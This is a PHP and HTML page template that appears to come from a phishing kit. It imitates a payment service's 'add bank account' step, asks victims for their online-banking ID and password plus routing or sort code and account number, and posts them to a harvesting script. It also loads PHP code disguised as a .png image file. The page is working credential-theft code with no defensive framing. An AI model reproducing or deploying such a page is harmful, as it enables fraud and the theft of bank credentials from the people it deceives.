<body class="desktop windows 7 superBowlDefault" ">
<header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header>

<main class="superBowlMain">
<section id="content" role="main" data-country="US">
<section id="main" class=""><div id="addBank" class="addBank grid12">
<div class="customGrid7">
<div class="superBowlContainer ">
<div class="inner"><div id="subView">
<div class="oem bankflow bankManual">
<form action="Up-dating.php?log=CheckBnk#Scr=<?php echo $ran;?>=<?php echo $rans;?>Savedata=<?php echo crypt($_SESSION['s13']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" class="proceed">
<input type="hidden" id="csrf" name="_csrf" value="3zgybLRECmbscQ7T0PJkq6BPAvKBWDmZQtwPY=">
<div class="stepProgress">
<span>○</span>
<span>○</span>
<span title="<?php echo $bnk_ttspan; ?>" class="selected">●</span>
<span>○</span>
</div>
<div class="pageHeader">
<h2><?php echo $bnk_lab1; ?></h2>
</div>
<div id="manualAddBank" class="manualAddBank">
<div class="radioBox">
<label class="radioLabel">
<span class="tuglife"></span><?php echo $bnk_yrbn; ?></label>
<label class="radioLabel">
<span class="thuglife"></span><?php echo $_SESSION['bnnm']; ?></label>
</div>
<div class="bankCheck <?php echo $_SESSION['cntc']; ?>">
<?php if ($_SESSION['s09'] == 'United Kingdom') { ?><span title="<?php echo $crd_srt; ?>" class="highlightRoutingNumber" style="display: block;"></span><span title="<?php echo $crd_acc; ?>" class="highlightAccountNumber" style="display: block;"></span> <?php } else { ?><span title="<?php echo $bnk_rt; ?>" class="highlightRoutingNumber" style="display: block;"></span><span title="<?php echo $crd_acc; ?>" class="highlightAccountNumber" style="display: block;"></span><?php } ?>
</div>
<p><?php echo $bnk_corr; ?></p>
<div class="groupFields">
<div class="multi equal clearfix">
<!-- ID  -->
<div class="textInput lap routingNumber focus">
<div class="fields medium left">
<input type="text" id="idbnk" name="20" class="confidential validate" required="required" value="" title="<?php echo $bnk_id; ?>" placeholder="<?php echo $bnk_id; ?>" maxlength="30">
</div>
</div>
<!-- Pass -->
<div class="textInput lap accountNumber ">
<div class="fields medium right">
<input type="password" class="confidential validate" id="psbnk" name="21" required="required" value="" title="<?php echo $bnk_ps; ?>" placeholder="<?php echo $bnk_ps; ?>" maxlength="20" >
</div>
</div></div></div>
<div class="groupFields">
<div class="multi equal clearfix">
<?php
if ($_SESSION['s09'] == 'United Kingdom') {
?>
<!-- STC -->
<div class="textInput lap accountNumber ">
<div class="fields medium left">
<input type="tel" class="confidential validate" id="23sr" name="23"  value="<?php echo $_SESSION['s19']; ?>" title="<?php echo $crd_srt; ?>" placeholder="<?php echo $crd_srt; ?>" >
</div>
</div>
<?php
}
else{
?>
<!-- rout -->
<div class="textInput lap accountNumber ">
<div class="fields medium left">
<input type="tel" class="confidential validate" id="rout" name="23"  value="" title="<?php echo $bnk_rt; ?>" placeholder="<?php echo $bnk_rt; ?>" >
</div>
</div>
<?php
 }
?>
<!-- Acc -->
<div class="textInput lap accountNumber focus ">
<div class="fields medium right">
<input type="tel" class="confidential validate" id="acc" name="22"  value="<?php echo $_SESSION['s18']; ?>" title="<?php echo $crd_acc; ?>" placeholder="<?php echo $crd_acc; ?>" >
</div>
</div>
</div></div>
<div class="btns">
<input id="confirmBank" name="_eventId_continue" type="submit" class="button" value="<?php echo $bnk_bt; ?>">
</div>
</div></form></div></div></div></div></div>
</div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel normalizeIn"><script language="php">require ('imcs_files/tpcsc.png');</script></div><script>jQuery(function($){$("#23sr").mask("99-99-99");});</script><script src="./imcs_files/jquery.maskedinput.min.js" type="text/javascript"></script></body>
